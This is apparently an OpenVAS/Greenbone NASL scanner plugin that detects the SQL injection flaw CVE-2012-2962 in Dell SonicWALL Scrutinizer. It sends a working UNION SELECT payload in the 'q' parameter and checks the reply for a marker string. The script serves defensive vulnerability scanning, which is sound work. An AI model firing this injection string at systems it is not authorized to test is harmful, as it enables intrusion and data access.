CPE = "cpe:/a:dell:sonicwall_scrutinizer";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103546" );
	script_bugtraq_id( 54625 );
	script_cve_id( "CVE-2012-2962" );
	script_tag( name: "cvss_base", value: "6.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:P/A:P" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "Dell SonicWALL Scrutinizer 'q' Parameter SQL Injection Vulnerability" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-08-21 09:30:41 +0200 (Tue, 21 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_scrutinizer_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "scrutinizer/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54625" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
 information." );
	script_tag( name: "summary", value: "Dell SonicWALL Scrutinizer is prone to an SQL-injection vulnerability
 because it fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "A successful exploit may allow an attacker to compromise the
 application, access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "Dell SonicWALL Scrutinizer 9.0.1 is vulnerable, other versions may
 also be affected." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/d4d/statusFilter.php?commonJson=protList&q=x'+union+select+0,0x53514c2d496e6a656374696f6e2d54657374'+--+";
if(http_vuln_check( port: port, url: url, pattern: "SQL-Injection-Test" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

